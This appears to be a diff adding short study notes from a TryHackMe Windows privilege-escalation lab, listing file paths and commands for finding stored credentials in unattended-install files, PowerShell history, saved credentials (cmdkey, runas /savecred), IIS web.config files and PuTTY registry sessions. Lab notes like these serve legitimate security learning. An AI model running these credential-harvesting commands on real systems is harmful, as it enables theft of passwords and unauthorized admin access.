@@ -1,0 +1,30 @@
+Windows Privilege Escalation (A TryHackMe Challenge: for Educational Purposes only) 
+
+via Windows Installation
+
+1. Check in the following paths and look for credentials in the <Password></Password> section
+C:\Unattend.xml
+C:\Windows\Panther\Unattend.xml
+C:\Windows\Panther\Unattend\Unattend.xml
+C:\Windows\system32\sysprep.inf
+C:\Windows\system32\sysprep\sysprep.xml
+
+
+via Powershell History
+
+1. type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt 
+
+via Saved Windows Credentials
+
+1. cmdkey /list will output all saved credentials on the instance
+2. runas /savecred /user:admin cmd.exe to spin up a shell as the user
+
+via IIS conf
+
+1. Check the following paths (usually found in database connection strings)
+C:\inetpub\wwwroot\web.config
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
+
+via Putty
+
+1. reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s (if users store their sessions there)
